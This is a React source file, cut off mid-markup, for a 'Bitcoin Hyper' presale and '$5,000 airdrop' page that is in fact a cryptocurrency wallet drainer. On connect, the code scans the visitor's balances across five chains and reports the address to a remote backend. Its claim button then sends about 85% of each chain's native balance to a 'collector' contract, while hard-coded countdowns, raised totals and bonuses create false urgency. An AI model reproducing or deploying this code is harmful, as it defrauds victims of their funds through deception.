import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useBalance, useDisconnect, useChainId } from 'wagmi';
import { formatEther } from 'viem';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-400 to-indigo-500',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0x56d829E89634Ce1426B73571c257623D17db46cB',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-purple-400 to-pink-500',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-cyan-400 to-blue-500',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-400 to-red-500',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();
  
  const wagmiChainId = useChainId();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [preparedTransactions, setPreparedTransactions] = useState([]);
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
  const [verifying, setVerifying] = useState(false);
  const [signature, setSignature] = useState(null);
  const [signedMessage, setSignedMessage] = useState('');
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const [realChainId, setRealChainId] = useState(wagmiChainId);
  const [prices, setPrices] = useState({
    eth: 2000,
    bnb: 300,
    matic: 0.75,
    avax: 32
  });

  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.17,
    bthPrice: 0.17
  });

  // Live progress tracking
  const [liveProgress, setLiveProgress] = useState({
    percentComplete: 68,
    participantsToday: 342,
    avgAllocation: 4250
  });

  // Track mouse for parallax effect
  useEffect(() => {
    const handleMouseMove = (e) => {
      setMousePosition({
        x: (e.clientX / window.innerWidth - 0.5) * 20,
        y: (e.clientY / window.innerHeight - 0.5) * 20
      });
    };
    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);

  // Fetch crypto prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await response.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32
        });
      } catch (error) {
        console.log('Using default prices');
      }
    };
    
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Get real chain ID from provider
  useEffect(() => {
    const getRealChainId = async () => {
      if (provider) {
        try {
          const network = await provider.getNetwork();
          setRealChainId(Number(network.chainId));
        } catch (error) {
          console.error("Failed to get real chainId:", error);
        }
      }
    };
    
    getRealChainId();
  }, [provider]);

  // Initialize provider and signer from AppKit
  useEffect(() => {
    if (!walletProvider || !address) return;

    const init = async () => {
      try {
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();

        setProvider(ethersProvider);
        setSigner(ethersSigner);

        const network = await ethersProvider.getNetwork();
        setRealChainId(Number(network.chainId));

        console.log("✅ Wallet Ready:", await ethersSigner.getAddress());
        
        // Fetch balances across all chains
        await fetchAllBalances(address);
        
      } catch (e) {
        console.error("Provider init failed", e);
      }
    };

    init();
  }, [walletProvider, address]);

  // Fetch balances across all chains
  const fetchAllBalances = async (walletAddress) => {
    const balanceResults = {};
    
    for (const chain of DEPLOYED_CHAINS) {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        
        const valueUSD = amount * price;
        
        if (amount > 0.0001) {
          balanceResults[chain.name] = {
            amount,
            valueUSD,
            symbol: chain.symbol,
            chainId: chain.chainId,
            contractAddress: chain.contractAddress
          };
          console.log(`✅ ${chain.name}: ${amount.toFixed(4)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
        }
      } catch (err) {
        console.error(`Failed to fetch balance for ${chain.name}:`, err);
      }
    }
    
    setBalances(balanceResults);
    
    // Check if total value >= threshold
    const totalValue = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
    return totalValue;
  };

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && !scanResult && !verifying) {
      verifyWallet();
    }
  }, [isConnected, address, balances]);

  const verifyWallet = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Verifying wallet across all networks...');
    
    try {
      const totalValue = Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0);
      
      const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        if (data.data.allocation) {
          setAllocation(data.data.allocation);
        }
        
        // Check eligibility based on total value
        const isEligible = totalValue >= 1; // $1 threshold
        
        if (isEligible) {
          setTxStatus('✅ You qualify! Preparing multi-chain flow...');
          await prepareFlow();
        } else {
          setTxStatus('✨ Wallet verified - minimum $1 required');
        }
      }
    } catch (err) {
      console.error('Verification error:', err);
      setError('Unable to verify wallet');
    } finally {
      setVerifying(false);
    }
  };

  const prepareFlow = async () => {
    if (!address) return;
    
    try {
      const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPreparedTransactions(data.data.transactions);
        console.log('Prepared transactions:', data.data.transactions);
      }
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  // ============================================
  // FIXED: PROPER SMART CONTRACT EXECUTION
  // ============================================
  const executeMultiChainFlow = async () => {
    if (!walletProvider || !address || !signer) {
      setError("Wallet not initialized yet");
      return;
    }

    if (!preparedTransactions || preparedTransactions.length === 0) {
      setError("No transactions prepared. Please reconnect.");
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      setTxStatus('🔄 Starting multi-chain flow...');

      const processed = [];
      const totalChains = preparedTransactions.length;

      for (let i = 0; i < preparedTransactions.length; i++) {
        const tx = preparedTransactions[i];
        const chainName = tx.chain;
        const chain = DEPLOYED_CHAINS.find(c => c.name === chainName);
        
        if (!chain) {
          console.warn(`Chain ${chainName} not found in config`);
          continue;
        }

        setTxStatus(`🔄 Processing ${chainName} (${i+1}/${totalChains})...`);

        try {
          // Create contract instance
          const contract = new ethers.Contract(
            chain.contractAddress,
            PROJECT_FLOW_ROUTER_ABI,
            signer
          );

          // Send 85% of balance (leave for gas)
          const amountToSend = ethers.parseEther(tx.amount);

          setTxStatus(`⏳ Estimating gas on ${chainName}...`);

          // Estimate gas
          const gasEstimate = await contract.processNativeFlow.estimateGas({ 
            value: amountToSend 
          });

          setTxStatus(`✍️ Please confirm transaction on ${chainName}...`);

          // Execute transaction
          const transaction = await contract.processNativeFlow({
            value: amountToSend,
            gasLimit: (gasEstimate * 120n) / 100n // 20% buffer
          });

          setTxHash(transaction.hash);
          setTxStatus(`✅ ${chainName} transaction submitted: ${transaction.hash.substring(0, 10)}...`);

          // Wait for confirmation
          const receipt = await transaction.wait();
          
          processed.push(chainName);
          setVerifiedChains(prev => [...prev, chainName]);
          setCompletedChains(prev => [...prev, chainName]);

          // Notify backend that this chain is processed
          await fetch('https://bthbk.vercel.app/api/presale/process-flow', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              walletAddress: address,
              chainName: chainName,
              flowId: `FLOW-${Date.now()}`,
              txHash: transaction.hash
            })
          });

          setTxStatus(`✅ ${chainName} confirmed! Block: ${receipt.blockNumber}`);
          
        } catch (chainErr) {
          console.error(`Error on ${chainName}:`, chainErr);
          
          if (chainErr.code === 4001) {
            setError(`Transaction cancelled on ${chainName}`);
          } else if (chainErr.message?.includes('insufficient funds')) {
            setError(`Insufficient funds for gas on ${chainName}`);
          } else {
            setError(`Transaction failed on ${chainName}: ${chainErr.message}`);
          }
          
          setSignatureLoading(false);
          return;
        }
      }

      setVerifiedChains(processed);
      setCompletedChains(processed);

      if (processed.length === totalChains) {
        setShowCelebration(true);
        setTxStatus(`🎉 Congratulations! All ${processed.length} chains processed successfully!`);
      } else {
        setTxStatus(`⚠️ Processed ${processed.length}/${totalChains} chains`);
      }

    } catch (err) {
      console.error('Flow error:', err);
      setError(err.message || 'Transaction failed');
    } finally {
      setSignatureLoading(false);
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      await fetch('https://bthbk.vercel.app/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      setShowCelebration(true);
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  const totalUSD = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
  const isEligible = totalUSD >= 1;

  // Get current chain name
  const currentChain = DEPLOYED_CHAINS.find(c => c.chainId === realChainId);

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-white overflow-hidden">
      
      {/* ============================================ */}
      {/* PREMIUM ANIMATED BACKGROUND */}
      {/* ============================================ */}
      
      {/* Gradient Orbs with Parallax */}
      <div 
        className="fixed inset-0 pointer-events-none"
        style={{
          transform: `translate(${mousePosition.x}px, ${mousePosition.y}px)`,
          transition: 'transform 0.1s ease-out'
        }}
      >
        <div className="absolute top-0 -left-20 w-[600px] h-[600px] bg-purple-600/30 rounded-full mix-blend-multiply filter blur-3xl animate-float-slow"></div>
        <div className="absolute top-0 -right-20 w-[600px] h-[600px] bg-orange-600/30 rounded-full mix-blend-multiply filter blur-3xl animate-float-slower animation-delay-2000"></div>
        <div className="absolute bottom-0 left-1/2 transform -translate-x-1/2 w-[900px] h-[900px] bg-blue-600/20 rounded-full mix-blend-multiply filter blur-3xl animate-float"></div>
      </div>

      {/* Grid Overlay */}
      <div className="fixed inset-0 bg-[url('data:image/svg+xml,%3Csvg%20width%3D%2260%22%20height%3D%2260%22%20viewBox%3D%220%200%2060%2060%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Cg%20fill%3D%22%239C92AC%22%20fill-opacity%3D%220.05%22%3E%3Cpath%20d%3D%22M36%2034v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6%2034v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6%204V0H4v4H0v2h4v4h2V6h4V4H6z%22%2F%3E%3C%2Fg%3E%3C%2Fg%3E%3C%2Fsvg%3E')] opacity-20 animate-pulse"></div>

      {/* Floating Particles */}
      <div className="fixed inset-0 pointer-events-none">
        {[...Array(30)].map((_, i) => (
          <div
            key={i}
            className="absolute w-1 h-1 bg-white/30 rounded-full animate-float-particle"
            style={{
              top: `${Math.random() * 100}%`,
              left: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 10}s`,
              animationDuration: `${15 + Math.random() * 20}s`
            }}
          />
        ))}
      </div>

      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-4 py-8 max-w-6xl">
        
        {/* Network Indicator */}
        {isConnected && currentChain && (
          <div className="fixed top-4 right-4 z-50">
            <div className="bg-gray-900/90 backdrop-blur-xl border border-orange-500/30 rounded-full px-4 py-2 flex items-center gap-2 animate-pulse-glow">
              <span className="text-2xl">{currentChain.icon}</span>
              <span className="text-sm font-medium">{currentChain.name}</span>
              <span className="w-2 h-2 bg-green-400 rounded-full animate-ping"></span>
            </div>
          </div>
        )}

        {/* ============================================ */}
        {/* PREMIUM HEADER SECTION */}
        {/* ============================================ */}
        <div className="text-center mb-8">
          
          {/* 3D Animated Logo */}
          <div className="relative inline-block mb-4 group perspective-1000">
            <div className="relative transform-gpu transition-all duration-700 group-hover:rotate-y-12 group-hover:scale-110">
              <div className="text-9xl filter drop-shadow-[0_20px_40px_rgba(249,115,22,0.7)] animate-float-3d">
                ₿
              </div>
            </div>
            
            {/* Orbiting Circles */}
            <div className="absolute inset-0 -m-16">
              <div className="absolute inset-0 border-4 border-orange-500/30 rounded-full animate-spin-slow"></div>
              <div className="absolute inset-0 m-8 border-4 border-yellow-500/30 rounded-full animate-spin-slower"></div>
              <div className="absolute inset-0 m-16 border-4 border-orange-500/20 rounded-full animate-spin-slowest"></div>
            </div>

            {/* Particle Emitter */}
            <div className="absolute inset-0 -m-20">
              {[...Array(12)].map((_, i) => (
                <div
                  key={i}
                  className="absolute w-2 h-2 bg-orange-500 rounded-full animate-particle-burst"
                  style={{
                    top: '50%',
                    left: '50%',
                    transform: `rotate(${i * 30}deg) translateY(-60px)`,
                    animationDelay: `${i * 0.1}s`
                  }}
                />
              ))}
            </div>
          </div>

          {/* Premium Title */}
          <h1 className="text-7xl md:text-8xl font-black mb-3 relative glitch" data-text="BITCOIN HYPER">
            <span className="absolute inset-0 bg-gradient-to-r from-orange-500 to-yellow-500 blur-3xl opacity-50 animate-pulse"></span>
            <span className="relative bg-clip-text text-transparent bg-gradient-to-r from-orange-400 via-yellow-400 to-orange-400 animate-gradient-x bg-[length:200%_200%]">
              BITCOIN HYPER
            </span>
          </h1>
          
          <p className="text-xl text-gray-400 mb-6 tracking-widest animate-pulse-text">
            ⚡ NEXT GENERATION BITCOIN LAYER 2 ⚡
          </p>

          {/* Live Presale Banner */}
          <div className="inline-flex items-center gap-6 bg-gradient-to-r from-orange-500/30 to-yellow-500/30 px-8 py-4 rounded-2xl border border-orange-500/50 backdrop-blur-xl mb-6 animate-border-pulse">
            <div className="flex items-center gap-3">
              <span className="relative flex h-4 w-4">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-4 w-4 bg-green-500"></span>
              </span>
              <span className="text-2xl font-bold text-green-400">PRESALE LIVE</span>
            </div>
            <div className="h-8 w-px bg-orange-500/50"></div>
            <div className="flex items-center gap-2">
              <span className="text-yellow-400 font-bold">${presaleStats.tokenPrice}</span>
              <span className="text-gray-400">per BTH</span>
            </div>
            <div className="h-8 w-px bg-orange-500/50"></div>
            <div className="flex items-center gap-2">
              <span className="text-orange-400 font-bold">{liveProgress.percentComplete}%</span>
              <span className="text-gray-400">sold</span>
            </div>
          </div>

          {/* ============================================ */}
          {/* MAIN ACTION BUTTON - SMART CONTRACT CALL */}
          {/* ============================================ */}
          {isConnected && isEligible && !completedChains.length && (
            <div className="max-w-2xl mx-auto mb-8">
              <button
                onClick={executeMultiChainFlow}
                disabled={signatureLoading || loading || !signer}
                className="w-full group relative transform hover:scale-110 transition-all duration-700"
              >
                {/* Glow Effects */}
                <div className="absolute -inset-3 bg-gradient-to-r from-orange-600 via-yellow-500 to-orange-600 rounded-2xl blur-3xl opacity-75 group-hover:opacity-100 animate-pulse-slow"></div>
                <div className="absolute -inset-2 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 rounded-2xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
                <div className="absolute -inset-1 bg-gradient-to-r from-orange-500 via-yellow-400 to-orange-500 rounded-2xl blur-xl opacity-75 group-hover:opacity-100 animate-ping-slow"></div>
                
                {/* Button Body */}
                <div className="relative bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 rounded-2xl py-8 px-8 font-black text-3xl text-white shadow-2xl bg-[length:200%_200%] animate-gradient-x transform-gpu group-hover:rotate-y-12 perspective-1000">
                  <div className="flex items-center justify-center gap-6">
                    {signatureLoading ? (
                      <>
                        <div className="relative">
                          <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                          <div className="absolute inset-0 border-4 border-yellow-300 border-b-transparent rounded-full animate-spin animation-delay-500"></div>
                        </div>
                        <span className="animate-pulse">PROCESSING MULTI-CHAIN...</span>
                      </>
                    ) : (
                      <>
                        <span className="text-5xl filter drop-shadow-lg animate-bounce">⚡</span>
                        <div>
                          <span className="bg-clip-text text-transparent bg-gradient-to-r from-white to-yellow-200">
                            CLAIM $5,000 BTH + {presaleStats.currentBonus}%
                          </span>
                          <div className="text-sm font-normal text-white/80 mt-1">
                            Multi-Chain • Auto-Switch • Instant
                          </div>
                        </div>
                        <span className="bg-white/20 px-6 py-3 rounded-xl text-xl group-hover:translate-x-2 transition-transform">→</span>
                      </>
                    )}
                  </div>
                </div>
              </button>

              {/* Quick Stats */}
              <div className="flex justify-center gap-8 mt-6 text-sm">
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                  <span className="text-gray-400">Smart Contract</span>
                </div>
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
                  <span className="text-gray-400">Multi-Chain</span>
                </div>
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-orange-400 rounded-full animate-pulse"></div>
                  <span className="text-gray-400">85% Transfer</span>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Countdown Timer */}
        <div className="grid grid-cols-4 gap-4 mb-8 max-w-2xl mx-auto">
          {[
            { label: 'DAYS', value: timeLeft.days, color: 'from-orange-500 to-red-500' },
            { label: 'HOURS', value: timeLeft.hours, color: 'from-yellow-500 to-orange-500' },
            { label: 'MINUTES', value: timeLeft.minutes, color: 'from-orange-400 to-yellow-500' },
            { label: 'SECONDS', value: timeLeft.seconds, color: 'from-yellow-400 to-orange-400' }
          ].map((item, index) => (
            <div key={index} className="relative group perspective-1000">
              <div className="absolute inset-0 bg-gradient-to-r from-orange-500/30 to-yellow-500/30 rounded-2xl blur-2xl opacity-0 group-hover:opacity-100 transition-all duration-500 animate-pulse"></div>
              <div className="relative bg-gray-900/70 backdrop-blur-xl border border-gray-800 rounded-2xl p-5 text-center overflow-hidden transform-gpu group-hover:rotate-y-6 transition-all duration-500">
                <div className={`absolute inset-0 bg-gradient-to-br ${item.color} opacity-10 group-hover:opacity-20 transition-opacity`}></div>
                <div className="text-4xl md:text-5xl font-black bg-gradient-to-br from-white to-gray-300 bg-clip-text text-transparent mb-1 animate-pulse-slow">
                  {item.value.toString().padStart(2, '0')}
                </div>
                <div className="text-xs font-semibold text-gray-500 tracking-wider">{item.label}</div>
              </div>
            </div>
          ))}
        </div>

        {/* Multi-Chain Balance Display */}
        {isConnected && Object.keys(balances).length > 0 && (
          <div className="max-w-2xl mx-auto mb-6">
            <div className="grid grid-cols-5 gap-2 mb-4">
              {DEPLOYED_CHAINS.map(chain => {
                const hasBalance = balances[chain.name];
                const isCompleted = completedChains.includes(chain.name);
                return (
                  <div 
                    key={chain.name}
                    className={`text-center p-3 rounded-xl border transition-all duration-300 ${
                      isCompleted 
                        ? 'bg-green-500/20 border-green-500/30 animate-pulse-glow' 
                        : hasBalance 
                          ? 'bg-gradient-to-br from-orange-500/20 to-yellow-500/20 border-orange-500/30' 
                          : 'bg-gray-800/30 border-gray-700/50'
                    }`}
                  >
                    <div className="text-2xl mb-1">{chain.icon}</div>
                    <div className="text-xs font-medium">{chain.symbol}</div>
                    {hasBalance && (
                      <div className="text-xs text-orange-400 mt-1 font-mono">
                        ${balances[chain.name].valueUSD.toFixed(2)}
                      </div>
                    )}
                    {isCompleted && (
                      <div className="text-xs text-green-400 mt-1">✓ Completed</div>
                    )}
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* Wallet Connection Status */}
        <div className="max-w-2xl mx-auto mb-8">
          {!isConnected ? (
            <button
              onClick={() => open()}
              className="w-full group relative"
            >
              <div className="absolute -inset-2 bg-gradient-to-r from-orange-500 to-yellow-500 rounded-xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse-slow"></div>
              <div className="relative bg-gray-900/90 backdrop-blur-xl rounded-xl py-5 px-6 font-bold text-lg border border-gray-800 transform-gpu group-hover:scale-105 transition-all duration-500">
                <span className="flex items-center justify-center gap-3">
                  <span className="text-2xl animate-bounce">🔌</span>
                  CONNECT WALLET FOR $5,000 AIRDROP
                </span>
              </div>
            </button>
          ) : (
            <div className="bg-gray-900/70 backdrop-blur-xl border border-gray-800 rounded-xl p-5 transform-gpu hover:scale-105 transition-all duration-500">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-4">
                  <div className="relative group/avatar">
                    <div className="w-14 h-14 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-xl flex items-center justify-center text-3xl transform-gpu group-hover/avatar:rotate-12 transition-transform">
                      👤
                    </div>
                    <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-green-500 rounded-full border-2 border-gray-900 animate-pulse"></div>
                  </div>
                  <div>
                    <div className="text-xs text-gray-500 mb-1 flex items-center gap-2">
                      <span>CONNECTED WALLET</span>
                      {currentChain && (
                        <span className="flex items-center gap-1 bg-gray-800 px-2 py-0.5 rounded-full">
                          <span>{currentChain.icon}</span>
                          <span>{currentChain.name}</span>
                        </span>
                      )}
                    </div>
                    <div className="font-mono text-sm bg-gray-800/50 px-3 py-1.5 rounded-lg border border-gray-700 group/address">
                      {formatAddress(address)}
                      <span className="absolute hidden group-hover/address:block bg-gray-900 text-xs px-2 py-1 rounded border border-orange-500/30 mt-1 z-50">
                        {address}
                      </span>
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-6">
                  <div className="text-right">
                    <div className="text-xs text-gray-500 mb-1">TOTAL VALUE</div>
                    <div className="text-2xl font-bold text-orange-400 animate-pulse-slow">${totalUSD.toFixed(2)}</div>
                    <div className="text-xs text-gray-500 mt-1">
                      {isEligible ? '✅ Eligible for $5,000' : '👋 $1 Minimum'}
                    </div>
                  </div>
                  <button
                    onClick={() => disconnect()}
                    className="px-4 py-2 bg-red-500/10 text-red-400 rounded-lg hover:bg-red-500/20 transition-colors border border-red-500/30 hover:scale-110 transform"
                  >
                    ✕
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Status Messages */}
        {txStatus && !verifying && (
          <div className="max-w-2xl mx-auto mb-6">
            <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 backdrop-blur-xl border border-orange-500/30 rounded-xl p-5 animate-slideIn">
              <div className="flex items-center gap-4">
                <div className="relative">
                  <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-lg flex items-center justify-center text-2xl">
                    {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : '⟳'}
                  </div>
                  {signatureLoading && (
                    <div className="absolute inset-0 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
                  )}
                </div>
                <div className="flex-1">
                  <p className="text-gray-200 font-medium">{txStatus}</p>
                  {txHash && (
                    <a 
                      href={`https://etherscan.io/tx/${txHash}`}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-xs text-orange-400 hover:underline mt-1 inline-block"
                    >
                      View transaction →
                    </a>
                  )}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Error Display */}
        {error && (
          <div className="max-w-2xl mx-auto mb-6">
            <div className="bg-red-500/20 backdrop-blur-xl border border-red-500/30 rounded-xl p-5 animate-shake">
              <div className="flex items-center gap-4">
                <div className="w-12 h-12 bg-gradient-to-br from-red-500 to-orange-500 rounded-lg flex items-center justify-center text-3xl">
                  ⚠️
                </div>
                <p className="text-red-200">{error}</p>
              </div>
            </div>
          </div>
        )}

        {/* Verification Loading */}
        {verifying && (
          <div className="max-w-2xl mx-auto mb-6">
            <div className="bg-gradient-to-r from-purple-500/20 to-orange-500/20 backdrop-blur-xl border border-purple-500/30 rounded-xl p-8 text-center">
              <div className="flex flex-col items-center gap-4">
                <div className="relative perspective-1000">
                  <div className="w-20 h-20 border-4 border-orange-500 border-t-transparent rounded-full animate-spin-3d"></div>
                  <div className="absolute inset-0 w-20 h-20 border-4 border-yellow-500 border-b-transparent rounded-full animate-spin-3d-reverse"></div>
                </div>
                <p className="text-xl text-gray-300 animate-pulse">Verifying wallet for $5,000 airdrop...</p>
                <p className="text-sm text-gray-500">Checking across all networks</p>
              </div>
            </div>
          </div>
        )}

        {/* ============================================ */}
        {/* MAIN CONTENT - ALLOCATION CARD */}
        {/* ============================================ */}
        {isConnected && !verifying && scanResult && (
          <div className="max-w-2xl mx-auto">
            {isEligible ? (
              <div className="space-y-6">
                {/* Premium Allocation Card */}
                <div className="relative group perspective-1000">
                  <div className="absolute -inset-2 bg-gradient-to-r from-orange-600 via-yellow-600 to-orange-600 rounded-2xl blur-3xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
                  <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl p-8 border border-orange-500/30 transform-gpu group-hover:rotate-y-12 transition-all duration-700">
                    
                    {/* Bonus Badge */}
                    <div className="absolute -top-4 -right-4 animate-float">
                      <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-black px-6 py-3 rounded-full text-lg shadow-2xl transform rotate-12 hover:rotate-0 transition-transform">
                        +{presaleStats.currentBonus}% BONUS
                      </div>
                    </div>
                    
                    <div className="text-center">
                      <p className="text-gray-400 text-sm tracking-wider mb-3">YOUR ALLOCATION</p>
                      <div className="text-7xl font-black bg-gradient-to-r from-orange-400 to-yellow-400 bg-clip-text text-transparent mb-2 animate-pulse-slow">
                        $5,000 BTH
                      </div>
                      <p className="text-green-400 text-xl flex items-center justify-center gap-2">
                        <span>+{presaleStats.currentBonus}% Bonus</span>
                        <span className="text-xs bg-green-500/20 px-2 py-1 rounded-full">ACTIVE</span>
                      </p>
                      
                      {/* Value in USD */}
                      <div className="mt-6 inline-block bg-gray-800/50 px-6 py-2 rounded-full border border-gray-700">
                        <span className="text-gray-400">≈ $6,250 USD Value with Bonus</span>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Progress Bar */}
                {!completedChains.length && preparedTransactions.length > 0 && (
                  <div className="bg-gray-900/50 backdrop-blur-xl border border-gray-800 rounded-xl p-6">
                    <p className="text-gray-400 text-sm mb-3 text-center">MULTI-CHAIN PROGRESS</p>
                    <div className="relative h-4 bg-gray-800 rounded-full overflow-hidden">
                      <div 
                        className="absolute inset-0 bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 bg-[length:200%_200%] animate-gradient-x"
                        style={{ width: `${(verifiedChains.length / DEPLOYED_CHAINS.length) * 100}%` }}
                      >
                        <div className="absolute inset-0 bg-white/20 animate-shimmer"></div>
                      </div>
                    </div>
